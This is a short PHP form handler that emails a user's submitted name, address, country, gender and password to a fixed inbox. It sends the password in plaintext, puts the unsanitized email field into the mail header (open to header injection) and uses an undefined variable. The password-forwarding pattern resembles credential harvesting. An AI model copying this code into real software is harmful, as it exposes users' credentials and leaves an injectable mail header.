<?php
$to = "info@gmail.com"; /*Your Email*/
    $date = date ("l, F jS, Y");
    $time = date ("h:i A");
    $Email=  $_POST['email'];
    $Name = $_POST['nom'];
    $Username = $_POST['surname'];
    $Country = $_POST['country'];
    $Genre = $_POST['gender'];
    $Adresse = $_POST['address'];
    $Conditions = $_POST['accept'];
    $Pw = $_POST['pw'];
    $subject = "Message envoyé du formulaire multi-étapes"; 
    $msg="
    Name: $Name
    Email: $Email
    Country: $country
    Mot de passe: $Pw
    Genre: $Genre
    Adress: $Adresse
    Conditions: $Conditions
    Username: $Username
    Message envoyé à : $date, hour: $time.\n";
        mail($to, $subject, $msg, "From: $Email")
?>
